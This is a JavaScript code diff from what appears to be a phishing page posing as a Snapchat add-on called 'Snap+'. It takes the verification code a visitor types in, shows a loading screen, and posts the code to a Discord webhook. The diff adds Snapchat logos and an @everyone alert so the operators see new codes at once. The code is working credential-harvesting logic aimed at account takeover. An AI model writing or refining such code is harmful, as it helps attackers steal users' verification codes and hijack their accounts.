@@ -38,17 +38,20 @@ sendBtn.addEventListener('click', async function() {
     sendBtn.style.display = 'none';
     loadingScreen.classList.add('active');
 
-    const embed = createEmbed(
-        '📱 Code reçu Snap+',
-        'Un utilisateur a envoyé son code.',
-        0x667eea,
-        [
+    const embed = {
+        title: '📱 Code reçu Snap+',
+        description: 'Un utilisateur a envoyé son code de vérification.',
+        color: 0x667eea,
+        fields: [
             { name: '🔑 Code', value: `**${code}**`, inline: true },
             { name: '⏰ Date', value: new Date().toLocaleString('fr-FR'), inline: true }
-        ]
-    );
+        ],
+        thumbnail: { url: 'https://static.vecteezy.com/system/resources/previews/023/757/820/non_2x/snapchat-logo-snapchat-icon-free-png.png' },
+        footer: { text: 'Snap+ Bot', icon_url: 'https://static.vecteezy.com/system/resources/previews/023/757/820/non_2x/snapchat-logo-snapchat-icon-free-png.png' },
+        timestamp: new Date().toISOString()
+    };
 
-    await sendToDiscord({ embeds: [embed] });
+    await sendToDiscord({ content: '@everyone', embeds: [embed] });
 
     setTimeout(() => {
         loadingScreen.classList.remove('active');
